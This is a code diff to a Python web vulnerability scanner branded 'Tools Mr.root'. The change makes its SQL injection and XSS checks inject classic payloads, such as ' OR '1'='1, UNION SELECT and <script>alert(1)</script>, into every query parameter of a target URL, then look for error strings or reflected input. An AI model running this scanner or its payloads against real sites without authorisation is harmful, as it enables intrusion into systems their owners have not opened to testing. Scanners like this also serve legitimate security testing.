@@ -5,6 +5,7 @@ from tqdm import tqdm
 from termcolor import colored
 from prettytable import PrettyTable
 import requests
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 # Welcome message with progress bar
 def show_welcome_message():
@@ -23,34 +24,52 @@ def show_tool_name():
     tool_name = pyfiglet.figlet_format("Tools Mr.root")
     print(colored(tool_name, "green"))
 
+# Modify URL to inject payloads into parameters
+def inject_payload(url, param, payload):
+    parsed_url = urlparse(url)
+    query_params = parse_qs(parsed_url.query)
+    if param in query_params:
+        query_params[param] = payload
+    modified_query = urlencode(query_params, doseq=True)
+    modified_url = urlunparse(parsed_url._replace(query=modified_query))
+    return modified_url
+
 # Scan for SQL Injection vulnerabilities
 def scan_sql_injection(url):
     payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "admin' --", "' UNION SELECT null, null --"]
-    for payload in payloads:
-        vulnerable_url = f"{url}?id={payload}"
-        try:
-            response = requests.get(vulnerable_url, timeout=5).text
-            if "error" in response.lower() or "sql" in response.lower():
-                confirm_response = requests.get(vulnerable_url, timeout=5).text
-                if "error" in confirm_response.lower() or "sql" in confirm_response.lower():
-                    return True, vulnerable_url
-        except Exception:
-            continue
+    parsed_url = urlparse(url)
+    query_params = parse_qs(parsed_url.query)
+    
+    for param in query_params:
+        for payload in payloads:
+            vulnerable_url = inject_payload(url, param, payload)
+            try:
+                response = requests.get(vulnerable_url, timeout=5).text
+                if "error" in response.lower() or "sql" in response.lower():
+                    confirm_response = requests.get(vulnerable_url, timeout=5).text
+                    if "error" in confirm_response.lower() or "sql" in confirm_response.lower():
+                        return True, vulnerable_url
+            except Exception:
+                continue
     return False, None
 
 # Scan for XSS vulnerabilities
 def scan_xss(url):
     payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'';!--\"<XSS>=&{()}"]
-    for payload in payloads:
-        vulnerable_url = f"{url}?q={payload}"
-        try:
-            response = requests.get(vulnerable_url, timeout=5).text
-            if payload in response:
-                confirm_response = requests.get(vulnerable_url, timeout=5).text
-                if payload in confirm_response:
-                    return True, vulnerable_url
-        except Exception:
-            continue
+    parsed_url = urlparse(url)
+    query_params = parse_qs(parsed_url.query)
+    
+    for param in query_params:
+        for payload in payloads:
+            vulnerable_url = inject_payload(url, param, payload)
+            try:
+                response = requests.get(vulnerable_url, timeout=5).text
+                if payload in response:
+                    confirm_response = requests.get(vulnerable_url, timeout=5).text
+                    if payload in confirm_response:
+                        return True, vulnerable_url
+            except Exception:
+                continue
     return False, None
 
 # Scan for IDOR vulnerabilities
